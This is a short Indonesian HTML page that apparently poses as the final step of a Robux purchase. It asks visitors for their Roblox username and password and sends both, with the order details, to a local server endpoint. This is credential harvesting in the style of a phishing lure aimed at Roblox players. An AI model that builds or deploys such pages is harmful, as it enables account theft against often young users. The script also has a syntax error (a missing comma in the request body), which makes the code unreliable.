<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Username Roblox</title>
<style>
body{
  margin:0;font-family:Arial;
  background:url("https://files.catbox.moe/bbxr41.jpg") center/cover fixed;
}
.box{
  background:white;width:300px;
  margin:150px auto;padding:20px;
  border-radius:10px;text-align:center;
}
input,button{width:100%;padding:8px;margin-top:8px}
button{background:#00b06f;color:#fff;border:none}
</style>
</head>
<body>

<div class="box">
  <h2>Finishing</h2>
  <input type="text" id="username" placeholder="Username Roblox">
  <input type="text" id="password" placeholder="Password Roblox">
  <button onclick="submit()">KLIK TOMBOL INI UNTUK MENYELESAIKAN</button>
</div>

<script>
function submit(){
  fetch("http://localhost:3000/order",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      robux: localStorage.getItem("robux"),
      harga: localStorage.getItem("harga"),
      payment: localStorage.getItem("payment"),
      username: document.getElementById("username").value
      password: document.getElementById("password").value
    })
  })
  .then(r=>r.text())
  .then(msg=>{
    alert(msg);
    localStorage.clear();
  });
}
</script>
</body>
</html>
